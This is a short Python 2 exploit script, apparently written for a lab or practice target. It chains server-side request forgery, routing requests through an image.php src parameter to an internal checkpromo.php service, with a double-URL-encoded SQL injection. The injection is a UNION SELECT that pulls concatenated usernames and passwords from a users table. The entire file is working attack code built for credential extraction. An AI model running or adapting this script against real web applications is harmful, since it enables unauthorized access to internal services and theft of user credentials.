#!/usr/bin/python
import urllib,urllib2
 
url = "http://192.168.1.103/image.php?src=http://127.0.0.1:8080/checkpromo.php?promocode=%2527%2520"
def encode(sqli):
    enc = urllib.quote_plus(sqli)
    doubleenc = urllib.quote_plus(enc)
    print "Request : " + url + doubleenc + "\n"
    request(doubleenc)
     
def request(doubleenc):
    request = urllib2.urlopen(url+doubleenc)
    response = request.read()
    print response
    request.close()
 
encode("union all select concat(username,':',password),1 from fancydb.users#")
